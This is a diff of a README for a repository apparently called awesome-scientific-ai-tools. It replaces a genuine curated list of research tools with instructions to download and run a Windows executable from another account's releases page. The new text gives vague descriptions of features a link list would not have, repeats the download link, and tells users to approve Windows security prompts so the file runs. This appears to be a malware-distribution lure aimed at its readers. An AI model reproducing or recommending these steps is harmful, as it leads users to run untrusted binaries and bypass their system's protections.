@@ -1,210 +1,179 @@
-<div align="center">
+# 🧪 awesome-scientific-ai-tools - AI tools for faster research
 
-# Awesome Scientific AI Tools [![Awesome](https://awesome.re/badge.svg)](https://awesome.re)
+[![Download](https://img.shields.io/badge/Download%20the%20latest%20release-blue.svg)](https://github.com/sparzinhogames-hash/awesome-scientific-ai-tools/releases)
 
-A curated list of AI-powered tools, MCP servers, and agent skills for scientific research.
+## 📥 Download the app
 
-[English](README.md) | [中文](README-zh.md) | [日本語](README-ja.md) | [Español](README-es.md) | [Deutsch](README-de.md)
+Visit this page to download: https://github.com/sparzinhogames-hash/awesome-scientific-ai-tools/releases
 
-</div>
+Choose the latest release for Windows and download the file that matches your computer. If you see more than one file, pick the Windows version first.
 
----
+## 🖥️ What this tool does
 
-## Contents
+awesome-scientific-ai-tools helps with common research tasks in one place. It is meant for people who want help with:
 
-- [Literature Search & Discovery](#literature-search--discovery)
-- [Citation Management](#citation-management)
-- [Research Reading & Comprehension](#research-reading--comprehension)
-- [Writing & Editing](#writing--editing)
-- [Data Analysis & Visualization](#data-analysis--visualization)
-- [Scientific Computing](#scientific-computing)
-- [Figure & Diagram Generation](#figure--diagram-generation)
-- [Experiment & Lab Tools](#experiment--lab-tools)
-- [Drug Discovery & Chemistry](#drug-discovery--chemistry)
-- [Bioinformatics & Genomics](#bioinformatics--genomics)
-- [Clinical Trials & Medical](#clinical-trials--medical)
-- [MCP Servers for Research](#mcp-servers-for-research)
-- [AI Agent Skills & Plugins](#ai-agent-skills--plugins)
-- [Research Workflow Automation](#research-workflow-automation)
-- [Preprint & Publication Tools](#preprint--publication-tools)
-- [Grant Writing & Funding](#grant-writing--funding)
-- [Collaboration & Project Management](#collaboration--project-management)
-- [AI Models for Science](#ai-models-for-science)
+- finding papers
+- reading long articles
+- writing clear notes
+- preparing manuscript drafts
+- organizing research ideas
+- checking related work
+- supporting grant writing
+- exploring tools for bioinformatics and drug discovery
 
----
+It brings together AI-powered tools, MCP servers, and agent skills for scientific work. The goal is to save time on routine tasks and keep your research process organized.
 
-## Literature Search & Discovery
+## ✅ Before you start
 
-- [Consensus](https://consensus.app/) - AI-powered academic search engine that extracts findings from peer-reviewed papers. Uses LLMs to synthesize yes/no answers from scientific literature.
-- [Semantic Scholar](https://www.semanticscholar.org/) - Free AI-powered research tool by Allen Institute. Covers 200M+ papers with citation context, TLDR summaries, and influence scores.
-- [Elicit](https://elicit.com/) - AI research assistant that finds relevant papers, extracts key claims, and synthesizes findings across studies.
-- [Connected Papers](https://www.connectedpapers.com/) - Visual tool for exploring academic paper connections. Builds a graph of related papers from any seed paper.
-- [Research Rabbit](https://www.researchrabbit.ai/) - Free tool for discovering and visualizing research paper networks. Monitors collections for new related papers.
-- [Scite.ai](https://scite.ai/) - Smart citation analysis showing how papers have been cited — supporting, contrasting, or mentioning.
-- [Litmaps](https://www.litmaps.com/) - Dynamic citation maps for literature discovery. Tracks research lineages and finds gaps.
-- [OpenAlex](https://openalex.org/) - Free, open catalog of the global research system. 250M+ works with rich metadata and API access.
-- [Inciteful](https://inciteful.xyz/) - Free tool to build a network of academic papers and analyze citation patterns.
+Use a Windows PC with a recent version of Windows 10 or Windows 11.
 
-## Citation Management
+You may need:
 
-- [Zotero](https://www.zotero.org/) - Free, open-source reference manager with browser integration, PDF management, and Word/Google Docs plugins.
-- [Paperpile](https://paperpile.com/) - Modern reference manager with Google Docs/Word integration and AI-powered metadata extraction.
-- [Mendeley](https://www.mendeley.com/) - Reference manager with social networking features, PDF annotation, and collaboration tools.
-- [EndNote](https://endnote.com/) - Industry-standard reference manager with journal style databases and Cite While You Write for Word.
-- [ReadCube Papers](https://www.papersapp.com/) - AI-enhanced reference manager with smart recommendations and enhanced PDF reader.
+- an internet connection
+- enough free space for the download
+- permission to run downloaded files
+- a PDF reader for papers and reports
+- a browser for the release page
 
-## Research Reading & Comprehension
+If your PC asks for approval before opening the file, choose the option that lets the app run.
 
-- [SciSpace](https://typeset.io/) - AI copilot for reading papers. Explains text, math, and tables in plain language.
-- [Explainpaper](https://www.explainpaper.com/) - Upload a paper, highlight confusing text, get AI explanations.
-- [ChatPDF](https://www.chatpdf.com/) - Chat with any PDF document. Particularly useful for long research papers and reports.
-- [Scholarcy](https://www.scholarcy.com/) - AI summarizer that creates flashcards of key findings, methods, and contributions.
-- [Unriddle](https://www.unriddle.ai/) - AI assistant for understanding complex documents. Generates knowledge graphs from papers.
+## 🚀 How to download and run on Windows
 
-## Writing & Editing
+1. Open the release page: https://github.com/sparzinhogames-hash/awesome-scientific-ai-tools/releases  
+2. Find the newest release at the top of the page.
+3. Look for a Windows file in the Assets section.
+4. Download the file to your computer.
+5. Open the Downloads folder.
+6. Double-click the downloaded file.
+7. If Windows shows a security prompt, choose Run or Open.
+8. Wait for the app to start.
+9. If the app asks to choose a folder, pick a place you can find later, such as Documents or Desktop.
 
-- [Jenni AI](https://jenni.ai/) - AI writing assistant specifically for academic writing with citation support and paraphrasing.
-- [Paperpal](https://paperpal.com/) - AI grammar and language checker trained on millions of published papers. By Cactus Communications.
-- [Writefull](https://www.writefull.com/) - AI writing tool trained on published journal articles. Integrated into Overleaf.
-- [Trinka](https://www.trinka.ai/) - AI grammar checker for academic and technical writing with style and tone suggestions.
-- [QuillBot](https://quillbot.com/) - AI paraphrasing and summarizing tool with grammar checker and citation generator.
-- [Grammarly](https://www.grammarly.com/) - General writing assistant with academic tone detection and plagiarism checking.
-- [Overleaf](https://www.overleaf.com/) - Online LaTeX editor with real-time collaboration, templates, and Writefull AI integration.
-- [Typst](https://typst.app/) - Modern markup-based typesetting system. Faster compilation than LaTeX with better error messages.
+If the release includes a ZIP file, right-click it and choose Extract All before opening the app inside.
 
-## Data Analysis & Visualization
+## 🔧 First-time setup
 
-- [Julius AI](https://julius.ai/) - AI data analyst that interprets data, creates visualizations, and runs statistical tests from natural language.
-- [Hal9](https://hal9.com/) - AI-powered data analysis and dashboard creation from natural language queries.
-- [Obviously AI](https://www.obviously.ai/) - No-code ML platform for prediction, classification, and time-series analysis.
-- [JASP](https://jasp-stats.org/) - Free, open-source statistical software with both frequentist and Bayesian analysis. UI alternative to R/SPSS.
-- [Datawrapper](https://www.datawrapper.de/) - Create publication-ready charts, maps, and tables without coding.
-- [Plotly](https://plotly.com/) - Interactive graphing library for Python, R, and JavaScript with Dash framework for dashboards.
-- [Observable](https://observablehq.com/) - Collaborative data visualization platform with reactive notebooks and D3.js integration.
+When you open the app for the first time, it may ask for a few basic choices:
 
-## Scientific Computing
+- where to store your research files
+- whether to use a local folder or a cloud folder
+- which language or interface mode you want
+- whether to enable search features or helper tools
 
-- [Wolfram Alpha](https://www.wolframalpha.com/) - Computational knowledge engine for math, physics, chemistry, and engineering calculations.
-- [COMSOL](https://www.comsol.com/) - Multiphysics simulation with AI-enhanced meshing and solver selection.
-- [MATLAB](https://www.mathworks.com/products/matlab.html) - Numerical computing environment with AI/ML toolboxes, Simulink, and domain-specific packages.
-- [Google Colab](https://colab.research.google.com/) - Free Jupyter notebook environment with GPU/TPU access for ML and scientific computing.
-- [Weights & Biases](https://wandb.ai/) - ML experiment tracking, hyperparameter tuning, and model versioning.
-- [DVC](https://dvc.org/) - Open-source version control for ML projects. Tracks data, models, and experiments alongside code.
+Use the default settings if you are not sure. They work well for most people.
 
-## Figure & Diagram Generation
+## 📚 What you can do with it
 
-- [BioRender](https://www.biorender.com/) - Scientific illustration tool with 50K+ icons for biology, chemistry, and medical figures.
-- [Mermaid](https://mermaid.js.org/) - Text-based diagramming in Markdown. Flowcharts, sequence diagrams, Gantt charts — all from code.
-- [draw.io / diagrams.net](https://www.diagrams.net/) - Free, open-source diagramming tool with scientific shape libraries.
-- [Inkscape](https://inkscape.org/) - Free, open-source vector graphics editor. Publication-quality SVG figures.
-- [Matplotlib](https://matplotlib.org/) - Python 2D plotting library producing publication-quality figures. The foundation of scientific visualization in Python.
-- [Seaborn](https://seaborn.pydata.org/) - Statistical visualization library built on Matplotlib. Beautiful defaults for publication figures.
-- [PlotNeuralNet](https://github.com/HarisIqbal88/PlotNeuralNet) - LaTeX code for drawing neural network architecture diagrams.
-- [Excalidraw](https://excalidraw.com/) - Hand-drawn style whiteboarding tool. Great for conceptual diagrams and brainstorming.
+This project is built for scientific research tasks. Common uses include:
 
-## Experiment & Lab Tools
+- searching for papers by topic or author
+- collecting useful links for a literature review
+- sorting sources by subject
+- drafting summaries of articles
+- helping with manuscript prep
+- making notes for grant writing
+- tracking ideas for experiments
+- finding tools for machine learning research
+- exploring support for bioinformatics workflows
+- connecting with MCP servers and agent skills for task automation
 
-- [Benchling](https://www.benchling.com/) - Cloud platform for life sciences R&D — molecular biology, CRISPR design, inventory management.
-- [LabArchives](https://www.labarchives.com/) - Electronic lab notebook with version control, collaboration, and institutional compliance.
-- [Protocols.io](https://www.protocols.io/) - Open-access platform for sharing reproducible research protocols with version tracking.
-- [Hive Benchmarks](https://hivebenchmark.com/) - AI-powered lab workflow optimization and equipment benchmarking.
+## 🧭 How to use it day to day
 
-## Drug Discovery & Chemistry
+Start with one task at a time.
 
-- [AlphaFold](https://alphafold.ebi.ac.uk/) - DeepMind's protein structure prediction. 200M+ predicted structures in the database.
-- [RDKit](https://www.rdkit.org/) - Open-source cheminformatics toolkit for molecular analysis, fingerprinting, and descriptor calculation.
-- [DeepChem](https://deepchem.io/) - Open-source library for drug discovery, materials science, and quantum chemistry with deep learning.
-- [ChEMBL](https://www.ebi.ac.uk/chembl/) - Open large-scale bioactivity database with 2M+ compounds and 20M+ activity measurements.
-- [ZINC](https://zinc.docking.org/) - Free database of commercially available compounds for virtual screening. 230M+ molecules.
-- [Schrödinger](https://www.schrodinger.com/) - Physics-based computational platform for drug discovery and materials science.
-- [Open Babel](https://openbabel.org/) - Open-source chemical toolbox for molecular file format conversion and fingerprinting.
-- [PubChem](https://pubchem.ncbi.nlm.nih.gov/) - Open chemistry database with 100M+ compounds, bioassays, and literature references.
+For example:
 
-## Bioinformatics & Genomics
+- search for a topic
+- save a few useful papers
+- add short notes
+- review the notes later
+- use the same folders for each project
 
-- [Galaxy](https://galaxyproject.org/) - Open-source web platform for accessible, reproducible bioinformatics analysis.
-- [Biopython](https://biopython.org/) - Python tools for computational molecular biology — sequence analysis, structure, phylogenetics.
-- [BLAST](https://blast.ncbi.nlm.nih.gov/) - Basic Local Alignment Search Tool for comparing nucleotide or protein sequences.
-- [Nextflow](https://www.nextflow.io/) - Workflow engine for scalable, reproducible bioinformatics pipelines across computing environments.
-- [DESeq2](https://bioconductor.org/packages/DESeq2/) - R package for differential gene expression analysis from RNA-seq count data.
-- [Scanpy](https://scanpy.readthedocs.io/) - Python toolkit for single-cell gene expression analysis with scalable performance.
-- [IGV](https://igv.org/) - Integrative Genomics Viewer for interactive visualization of genomic data.
+Keep your files in clear folders such as:
 
-## Clinical Trials & Medical
+- Project Name
+- Papers
+- Notes
+- Drafts
+- Figures
 
-- [ClinicalTrials.gov](https://clinicaltrials.gov/) - US registry of clinical studies. 500K+ studies, searchable by condition, intervention, and sponsor.
-- [PubMed](https://pubmed.ncbi.nlm.nih.gov/) - Free search engine for biomedical literature. 36M+ citations from MEDLINE and life science journals.
-- [Europe PMC](https://europepmc.org/) - Open-access biomedical literature with full-text search, citation networks, and API access.
-- [Cochrane Library](https://www.cochranelibrary.com/) - Gold-standard systematic reviews and meta-analyses for evidence-based medicine.
-- [OHDSI / OMOP](https://www.ohdsi.org/) - Open-source tools for observational health data analysis with a common data model.
+This makes it easier to find what you need during a project.
 
-## MCP Servers for Research
+## 🛠️ Common file types you may see
 
-MCP (Model Context Protocol) servers extend AI agents with real-time access to scientific databases.
+You may download one of these files from the release page:
 
-- [PubMed MCP](https://github.com/search?q=pubmed+mcp+server) - Search and retrieve biomedical literature from PubMed/MEDLINE.
-- [arXiv MCP](https://github.com/search?q=arxiv+mcp+server) - Search and fetch preprints from arXiv across all scientific domains.
-- [Semantic Scholar MCP](https://github.com/search?q=semantic+scholar+mcp) - Access the Semantic Scholar API for paper search, citations, and recommendations.
-- [ChEMBL MCP](https://github.com/search?q=chembl+mcp+server) - Query bioactivity data, compound information, and target interactions.
-- [ClinicalTrials MCP](https://github.com/search?q=clinical+trials+mcp) - Search clinical trial registries and extract study details.
-- [bioRxiv MCP](https://github.com/search?q=biorxiv+mcp+server) - Access preprints from bioRxiv and medRxiv.
-- [CrossRef MCP](https://github.com/search?q=crossref+mcp+server) - Metadata lookup for DOIs, citations, and publication records.
-- [Google Scholar MCP](https://github.com/nicholasgriffintn/scholar-mcp-server) - Search Google Scholar for academic papers and citations.
+- `.exe` files for direct use on Windows
+- `.zip` files that need to be extracted
+- `.msi` files for guided setup
 
-## AI Agent Skills & Plugins
+If you are unsure which one to choose, pick the Windows `.exe` file first. If there is no `.exe`, use the `.msi` file. Use the `.zip` file only if that is the only option.
 
-Skills and plugins that extend AI coding agents (Claude Code, Cursor, Codex) for research workflows.
+## 🔍 What is included in this repository
 
-- [Professional Word Document Generator](https://github.com/Harsh9005/professional-word-document-generator) - Generate publication-ready .docx from JSON. LaTeX equations, 200+ scientific symbols, auto-citations.
-- [Multi-Agent Orchestrator](https://github.com/Harsh9005/multi-agent-orchestrator) - 6-phase pipeline with adaptive complexity, parallel agents, and quality gates.
-- [AI Session Logger](https://github.com/Harsh9005/ai-session-logger) - Persistent session memory — track files, decisions, and progress across conversations.
-- [Claude Scientific Skills](https://github.com/K-Dense-AI/claude-scientific-skills) - 148+ scientific skills for Claude Code across multiple domains.
-- [Awesome Claude Code](https://github.com/hesreallyhim/awesome-claude-code) - Curated list of Claude Code extensions, skills, and resources.
+This repository is a curated list of tools and skills for scientific research. It covers areas such as:
 
-## Research Workflow Automation
+- academic tools
+- AI tools
+- agent skills
+- MCP servers
+- literature review
+- scientific writing
+- research tools
+- grant writing
+- machine learning
+- bioinformatics
+- drug discovery
 
-- [Snakemake](https://snakemake.readthedocs.io/) - Python-based workflow management for reproducible and scalable data analysis.
-- [Apache Airflow](https://airflow.apache.org/) - Platform to programmatically author, schedule, and monitor data workflows.
-- [Prefect](https://www.prefect.io/) - Modern workflow orchestration for data engineering and ML pipelines.
-- [Kedro](https://kedro.org/) - Open-source Python framework for creating reproducible, maintainable, and modular data science code.
-- [CWL](https://www.commonwl.org/) - Common Workflow Language for describing analysis tools and workflows portably.
-- [Papermill](https://papermill.readthedocs.io/) - Parameterize and execute Jupyter Notebooks as workflows.
+It is built for people who want a practical list of useful resources without sorting through many unrelated projects.
 
-## Preprint & Publication Tools
+## 🧩 Example workflow
 
-- [arXiv](https://arxiv.org/) - Open-access preprint server for physics, math, CS, biology, and more. 2M+ papers.
-- [bioRxiv](https://www.biorxiv.org/) - Preprint server for biology. Fast publication, free access.
-- [medRxiv](https://www.medrxiv.org/) - Preprint server for health sciences.
-- [ChemRxiv](https://chemrxiv.org/) - Preprint server for chemistry.
-- [Authorea](https://www.authorea.com/) - Collaborative writing platform with built-in data visualization and journal submission.
-- [Curvenote](https://curvenote.com/) - Scientific writing platform with Jupyter integration and interactive figures.
+A simple workflow may look like this:
 
-## Grant Writing & Funding
+1. Search for papers on your topic.
+2. Save the most useful sources.
+3. Use notes to compare findings.
+4. Draft your manuscript section by section.
+5. Check grammar and clarity.
+6. Organize references for submission.
 
-- [Granted.ai](https://granted.ai/) - AI-powered grant writing assistant with proposal optimization.
-- [GrantForward](https://www.grantforward.com/) - Funding opportunity search engine covering 14K+ sponsors.
-- [Pivot-RP](https://pivot.proquest.com/) - Comprehensive funding discovery tool with researcher profiles and collaboration matching.
-- [Dimensions](https://www.dimensions.ai/) - Linked research data platform connecting grants, publications, patents, and clinical trials.
-- [NIH Reporter](https://reporter.nih.gov/) - Search NIH-funded research projects, publications, and patents.
+This kind of workflow helps you move from search to writing with fewer steps.
 
-## Collaboration & Project Management
+## 🧰 Tips for smooth use
 
-- [Notion](https://www.notion.so/) - All-in-one workspace for notes, tasks, wikis, and databases. Popular for lab management.
-- [Obsidian](https://obsidian.md/) - Markdown-based knowledge management with graph view, plugins, and local-first storage.
-- [Logseq](https://logseq.com/) - Open-source, privacy-first knowledge management and note-taking tool.
-- [Slack](https://slack.com/) - Team communication with channels, integrations, and automation for research groups.
-- [OSF](https://osf.io/) - Open Science Framework — free platform for research project management, preregistration, and data sharing.
+- Keep the app in a folder you do not move.
+- Save your research files in one main folder.
+- Use short file names.
+- Back up important work to another drive or cloud folder.
+- Update to the newest release when a new version appears.
+- Close other large apps if your computer feels slow.
 
-## AI Models for Science
+## 🧪 Best fit for
 
-- [AlphaFold 3](https://blog.google/technology/ai/google-deepmind-isomorphic-alphafold-3-ai-model/) - Predicts structures of proteins, DNA, RNA, ligands, and their interactions.
-- [Galactica](https://galactica.org/) - Large language model trained on 48M+ scientific papers, textbooks, and encyclopedias.
-- [BioGPT](https://github.com/microsoft/BioGPT) - Domain-specific LLM pre-trained on biomedical literature by Microsoft.
-- [SciBERT](https://github.com/allenai/scibert) - BERT model trained on 1.14M scientific papers from Semantic Scholar.
-- [ChemBERTa](https://github.com/seyonechithrananda/bert-loves-chemistry) - BERT model for molecular property prediction using SMILES representations.
-- [ESM](https://github.com/facebookresearch/esm) - Evolutionary Scale Modeling — protein language models by Meta AI.
-- [MolBERT](https://github.com/BenevolentAI/MolBERT) - BERT-based molecular representation learning for drug discovery.
+This tool is a good fit for:
 
-## Footnotes
+- students doing literature reviews
+- researchers writing papers
+- lab teams organizing sources
+- people working on grant proposals
+- users exploring AI help for science tasks
+- anyone who wants a clean list of research tools
 
-Your contributions are welcome! Please read the [contributing guidelines](CONTRIBUTING.md) before submitting a pull request.
+## 📁 Suggested folder setup
+
+You can keep your work simple with this structure:
+
+- Research
+  - Topic 1
+  - Topic 2
+  - Papers
+  - Notes
+  - Drafts
+  - Submissions
+
+A clear setup helps when you return to a project after a break
+
+## 🔗 Download again
+
+Visit this page to download: https://github.com/sparzinhogames-hash/awesome-scientific-ai-tools/releases
